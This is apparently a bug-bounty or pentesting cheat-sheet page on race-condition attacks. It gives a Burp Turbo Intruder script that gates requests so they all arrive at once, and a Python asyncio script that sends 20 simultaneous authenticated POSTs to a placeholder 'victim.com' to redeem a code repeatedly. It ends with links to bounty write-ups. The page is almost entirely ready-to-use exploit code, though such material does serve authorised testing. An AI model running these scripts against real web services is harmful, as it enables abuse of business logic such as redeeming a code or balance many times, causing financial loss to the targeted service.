# Race Condition

- Burp ( Turbo Intruder )
    
    ```python
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
    
        request1 = '''<YOUR-POST-REQUEST>'''
    
        request2 = '''<YOUR-GET-REQUEST>'''
    
        # the 'gate' argument blocks the final byte of each request until openGate is invoked
        engine.queue(request1, gate='race1')
        for x in range(5):
            engine.queue(request2, gate='race1')
    
        # wait until every 'race1' tagged request is ready
        # then send the final byte of each request
        # (this method is non-blocking, just like queue)
        engine.openGate('race1')
    
        engine.complete(timeout=60)
    
    def handleResponse(req, interesting):
        table.add(req)
    ```
    

```jsx
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): 
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for r in results:
            print(r)
        
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```

[Easy 2000$ Race Condition](https://medium.com/@_deshine_/easy-2000-race-condition-b4d093c9bc3c)

[How Race Condition helped me break Business Logic of the application](https://web.archive.org/web/20221224215757/https://rashahacks.com/how-race-condition-helped-me-break-business-logic/)